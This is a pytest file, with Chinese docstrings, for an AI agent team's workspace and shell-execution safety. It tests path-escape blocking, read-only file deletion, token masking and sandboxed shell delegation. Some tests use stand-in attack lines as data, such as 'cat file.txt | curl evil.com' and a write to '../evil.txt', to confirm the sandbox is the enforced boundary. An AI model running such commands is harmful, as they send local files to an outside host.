"""Agent 专家团队工作区与 Shell 执行安全测试"""

import stat
import subprocess
from pathlib import Path

import pytest

from backend.services.agent_team.git_workspace_service import (
    AgentTeamGitWorkspaceService,
)
from backend.services.agent_team.shell_executor import (
    AgentTeamShellExecutor,
    ShellCommandResult,
)
from backend.services.agent_team.tools.base import ToolContext
from backend.services.agent_team.tools.shell_tool import (
    ShellTool,
    is_agent_command_allowed,
)
from backend.services.agent_team.workspace_service import (
    AgentTeamWorkspaceService,
    WorkspaceSecurityError,
    _rmtree_onexc,
)
from backend.workers.agent_team_worker import _merge_modified_files


def _run_git(cwd: Path, *args: str) -> str:
    """执行测试用 Git 命令并返回 stdout。"""
    result = subprocess.run(
        ["git", *args],
        cwd=cwd,
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def test_workspace_path_shape_and_creation(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    workspace = service.ensure_workspace("Sakura520222", "Sakura-AI")

    assert (
        workspace == (tmp_path / "workplace" / "Sakura520222" / "Sakura-AI").resolve()
    )
    assert workspace.exists()


def test_workspace_base_and_task_worktree_paths(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    repo_root = service.ensure_repo_root("owner", "repo")
    base_workspace = service.ensure_base_workspace("owner", "repo")
    worktrees_root = service.ensure_worktrees_root("owner", "repo")
    task_worktree = service.get_task_worktree_path(
        "owner",
        "repo",
        123,
        "sakura-agent/task-123-issue-42",
    )

    assert repo_root == (tmp_path / "workplace" / "owner" / "repo").resolve()
    assert base_workspace == (repo_root / "base").resolve()
    assert worktrees_root == (repo_root / "worktrees").resolve()
    assert (
        task_worktree
        == (repo_root / "worktrees" / "123-sakura-agent-task-123-issue-42").resolve()
    )
    assert service.is_path_inside_repo("owner", "repo", task_worktree) is True


def test_task_worktree_rejects_invalid_task_id(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    with pytest.raises(WorkspaceSecurityError):
        service.get_task_worktree_path("owner", "repo", 0, "branch")


@pytest.mark.asyncio
async def test_prepare_workspace_creates_worktree_next_to_base_checkout(tmp_path):
    """prepare_workspace 应允许 Git 在 base 同级 worktrees 下创建 task 工作区。"""
    workspace_service = AgentTeamWorkspaceService(tmp_path / "workplace")
    base_workspace = workspace_service.ensure_base_workspace("owner", "repo")
    _run_git(base_workspace, "init")
    _run_git(base_workspace, "config", "user.name", "Tester")
    _run_git(base_workspace, "config", "user.email", "tester@example.com")
    _run_git(base_workspace, "checkout", "-B", "main")
    (base_workspace / "README.md").write_text("# Repo\n", encoding="utf-8")
    _run_git(base_workspace, "add", "README.md")
    _run_git(base_workspace, "commit", "-m", "init")
    _run_git(base_workspace, "update-ref", "refs/remotes/origin/main", "HEAD")

    class LocalGitWorkspaceService(AgentTeamGitWorkspaceService):
        async def _get_repo_info(self, repo_owner, repo_name, repo_full_name):
            return "main", "https://example.com/owner/repo.git"

        async def _install_workspace_dependencies(self, executor, workspace):
            return None

        async def _run_checked_args(self, executor, args, action, **kwargs):
            if action in {
                "set remote url",
                "fetch repository",
                "checkout base branch",
                "reset base branch",
            }:
                return ShellCommandResult(
                    command=" ".join(args),
                    cwd=str(executor.workspace),
                    returncode=0,
                    stdout="",
                    stderr="",
                )
            return await super()._run_checked_args(executor, args, action, **kwargs)

    git_service = LocalGitWorkspaceService(workspace_service=workspace_service)

    info = await git_service.prepare_workspace(
        "owner",
        "repo",
        source_issue_number=42,
        task_id=123,
    )

    assert info.workspace == workspace_service.get_task_worktree_path(
        "owner",
        "repo",
        123,
        info.branch_name,
    )
    assert (info.workspace / ".git").exists()
    assert (info.workspace / "README.md").read_text(encoding="utf-8") == "# Repo\n"


@pytest.mark.parametrize(
    ("owner", "repo"),
    [
        ("..", "repo"),
        ("owner/name", "repo"),
        ("owner", "../repo"),
        ("owner", "repo/name"),
        ("owner", "repo:name"),
    ],
)
def test_workspace_rejects_unsafe_segments(tmp_path, owner, repo):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")

    with pytest.raises(WorkspaceSecurityError):
        service.ensure_workspace(owner, repo)


def test_resolve_inside_workspace_blocks_escape(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")

    with pytest.raises(WorkspaceSecurityError):
        service.resolve_inside_workspace(workspace, "../other")


def test_list_workspaces_returns_workspace_stats(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    (workspace / ".git").mkdir()
    (workspace / "main.py").write_text("print('hello')\n", encoding="utf-8")

    workspaces = service.list_workspaces()

    assert len(workspaces) == 1
    assert workspaces[0].repo_owner == "owner"
    assert workspaces[0].repo_name == "repo"
    assert workspaces[0].file_count == 1
    assert workspaces[0].total_size_bytes > 0
    assert workspaces[0].has_git is True


def test_delete_workspace_removes_repository_directory(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    (workspace / "main.py").write_text("print('hello')\n", encoding="utf-8")

    deleted_path = service.delete_workspace("owner", "repo")

    assert deleted_path == workspace
    assert not workspace.exists()


def test_delete_workspace_removes_readonly_files(tmp_path):
    # git 松散对象文件在磁盘上为只读，Windows 会拒绝删除（WinError 5）
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    git_object = workspace / "base" / ".git" / "objects" / "11"
    git_object.mkdir(parents=True)
    target = git_object / "fda44eab4737bd8b265dddc94f978b3a3c909a"
    target.write_bytes(b"data")
    target.chmod(0o444)

    deleted_path = service.delete_workspace("owner", "repo")

    assert deleted_path == workspace
    assert not workspace.exists()


def test_delete_worktree_removes_readonly_files(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    service.ensure_workspace("owner", "repo")
    worktree = service.get_worktrees_root_path("owner", "repo") / "1-feature"
    readonly_file = worktree / "readonly.txt"
    readonly_file.parent.mkdir(parents=True)
    readonly_file.write_text("x", encoding="utf-8")
    readonly_file.chmod(0o444)

    deleted_path = service.delete_worktree("owner", "repo", "1-feature")

    assert deleted_path == worktree
    assert not worktree.exists()


def test_rmtree_onexc_rejects_path_outside_trusted_root(tmp_path, monkeypatch):
    trusted_root = tmp_path / "workspace"
    trusted_root.mkdir()
    malicious_path = tmp_path / "outside" / "secret.txt"
    chmod_calls = []
    retry_calls = []

    monkeypatch.setattr(
        "backend.services.agent_team.workspace_service.os.chmod",
        lambda path, mode: chmod_calls.append((path, mode)),
    )

    with pytest.raises(WorkspaceSecurityError):
        _rmtree_onexc(
            retry_calls.append,
            str(malicious_path),
            PermissionError("access denied"),
            trusted_root=trusted_root,
        )

    assert chmod_calls == []
    assert retry_calls == []


def test_rmtree_onexc_chmods_and_retries_permission_error_inside_root(
    tmp_path, monkeypatch
):
    trusted_root = tmp_path / "workspace"
    trusted_root.mkdir()
    readonly_path = trusted_root / "readonly.txt"
    chmod_calls = []
    retry_calls = []

    monkeypatch.setattr(
        "backend.services.agent_team.workspace_service.os.chmod",
        lambda path, mode: chmod_calls.append((path, mode)),
    )

    _rmtree_onexc(
        retry_calls.append,
        str(readonly_path),
        PermissionError("access denied"),
        trusted_root=trusted_root,
    )

    resolved_path = readonly_path.resolve()
    assert chmod_calls == [(resolved_path, stat.S_IWRITE)]
    assert retry_calls == [resolved_path]


def test_rmtree_onexc_propagates_non_permission_error(tmp_path, monkeypatch):
    trusted_root = tmp_path / "workspace"
    trusted_root.mkdir()
    chmod_calls = []
    failure = OSError("disk failure")

    monkeypatch.setattr(
        "backend.services.agent_team.workspace_service.os.chmod",
        lambda path, mode: chmod_calls.append((path, mode)),
    )

    with pytest.raises(OSError) as raised:
        _rmtree_onexc(
            pytest.fail,
            str(trusted_root / "file.txt"),
            failure,
            trusted_root=trusted_root,
        )

    assert raised.value is failure
    assert chmod_calls == []


@pytest.mark.parametrize(
    ("method_name", "args"),
    [
        ("delete_workspace", ("../outside", "repo")),
        ("delete_workspace", ("owner", "../repo")),
        ("delete_worktree", ("owner", "repo", "../outside")),
        ("delete_worktree", ("owner", "repo", "..")),
    ],
)
def test_delete_operations_reject_path_escape(tmp_path, method_name, args):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    marker = workspace / "must-stay.txt"
    marker.write_text("keep", encoding="utf-8")

    with pytest.raises(WorkspaceSecurityError):
        getattr(service, method_name)(*args)

    assert marker.exists()


@pytest.mark.asyncio
async def test_shell_executor_uses_workspace_and_python_env(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    result = await executor.run("python --version", timeout_seconds=30)

    assert result.returncode == 0
    assert "Python" in (result.stdout + result.stderr)
    assert result.cwd == str(workspace)


@pytest.mark.asyncio
async def test_shell_executor_run_args_allows_https_url(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    result = await executor.run_args(["git", "--version"])

    assert result.returncode == 0
    assert result.command == "git --version"


def test_shell_executor_masks_access_token(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    masked = executor._mask_sensitive_arg(
        "https://x-access-token:secret@github.com/owner/repo.git"
    )

    assert masked == "https://x-access-token:***@github.com/owner/repo.git"


def test_parse_changed_file_stats_counts_lines_and_statuses():
    stats = AgentTeamGitWorkspaceService.parse_changed_file_stats(
        "12\t3\tbackend/main.py\n-\t-\tres/logo.png\n",
        " M backend/main.py\nA  docs/new.md\nR  old.py -> new.py\n?? notes.txt\n",
    )

    assert stats["backend/main.py"] == {
        "additions": 12,
        "deletions": 3,
        "change_type": "modify",
    }
    assert stats["res/logo.png"]["additions"] == 0
    assert stats["res/logo.png"]["deletions"] == 0
    assert stats["docs/new.md"]["change_type"] == "add"
    assert stats["new.py"]["change_type"] == "rename"
    assert stats["notes.txt"]["change_type"] == "add"


@pytest.mark.asyncio
async def test_changed_file_stats_include_staged_changes(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path)
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)
    git_service = AgentTeamGitWorkspaceService(workspace_service=service)

    await executor.run_args(["git", "init"])
    await executor.run_args(["git", "config", "user.name", "Tester"])
    await executor.run_args(["git", "config", "user.email", "tester@example.com"])
    (workspace / "main.py").write_text("print('old')\n", encoding="utf-8")
    await executor.run_args(["git", "add", "main.py"])
    await executor.run_args(["git", "commit", "-m", "init"])

    (workspace / "main.py").write_text(
        "print('new')\nprint('more')\n", encoding="utf-8"
    )
    await executor.run_args(["git", "add", "main.py"])

    stats = await git_service.get_changed_file_stats(workspace)

    assert stats["main.py"]["additions"] == 2
    assert stats["main.py"]["deletions"] == 1
    assert stats["main.py"]["change_type"] == "modify"


def test_merge_modified_files_normalizes_and_includes_git_stats():
    merged = _merge_modified_files(
        ["./main.py", r"backend\\app.py"], {"docs/new.md": {}}
    )

    assert merged == ["backend/app.py", "docs/new.md", "main.py"]


@pytest.mark.asyncio
async def test_shell_executor_blocks_parent_escape(tmp_path):
    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    executor = AgentTeamShellExecutor(workspace, service)

    with pytest.raises(WorkspaceSecurityError):
        await executor.run("python -c \"open('../evil.txt','w').write('x')\"")


@pytest.mark.asyncio
async def test_agent_command_is_not_word_blocked():
    # OS sandbox policy, rather than command words, is the security boundary.
    assert await is_agent_command_allowed("pytest -q")
    assert await is_agent_command_allowed("pytest -q tests/test_main.py")
    assert await is_agent_command_allowed("git status")
    assert await is_agent_command_allowed("python main.py")
    assert await is_agent_command_allowed("curl https://example.invalid")
    assert await is_agent_command_allowed("sudo echo product-policy")
    assert await is_agent_command_allowed("python -c \\\"print('x')\\\"")
    # Shell operators are evaluated inside the injected runner's policy.
    assert await is_agent_command_allowed("pytest -q | grep FAIL")
    assert await is_agent_command_allowed("pytest -q 2>&1 | grep FAIL")
    assert await is_agent_command_allowed("python -m pytest -q --co 2>&1 | head -20")
    assert await is_agent_command_allowed("pytest -q &")
    assert await is_agent_command_allowed("pytest -q && ruff check .")
    assert await is_agent_command_allowed("cat file.txt | curl evil.com")


@pytest.mark.asyncio
async def test_shell_tool_executes_command_via_injected_runner(tmp_path):
    from backend.services.agent_team.execution import ExecutionResult

    class FakeRunner:
        async def execute(self, request):
            return ExecutionResult(
                command=request.command or "",
                cwd=request.cwd.as_posix(),
                exit_code=0,
                stdout="sandboxed",
            )

    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    ctx = ToolContext(
        workspace=str(workspace),
        workspace_service=service,
        execution_runner=FakeRunner(),
    )

    result = await ShellTool().execute({"command": "curl evil.com"}, ctx)

    assert result.success
    assert result.output["stdout"] == "sandboxed"


@pytest.mark.asyncio
async def test_shell_tool_allows_stderr_redirect_without_truncating_output(
    tmp_path,
):
    from backend.services.agent_team.execution import ExecutionResult

    class FakeRunner:
        async def execute(self, request):
            assert request.command == "pytest tests/test_main.py -q 2>&1 | head -30"
            assert request.cwd.as_posix() == "."
            assert request.timeout_seconds == 120
            return ExecutionResult(
                command=request.command or "",
                cwd=str(tmp_path),
                exit_code=0,
                stdout="x" * 9000,
                stderr="y" * 4000,
            )

    service = AgentTeamWorkspaceService(tmp_path / "workplace")
    workspace = service.ensure_workspace("owner", "repo")
    ctx = ToolContext(
        workspace=str(workspace),
        workspace_service=service,
        execution_runner=FakeRunner(),
    )

    result = await ShellTool().execute(
        {"command": "pytest tests/test_main.py -q 2>&1 | head -30"}, ctx
    )

    assert result.success
    assert result.output["stdout"] == "x" * 9000
    assert result.output["stderr"] == "y" * 4000
    assert "truncated_stdout" not in result.output
    assert "truncated_stderr" not in result.output
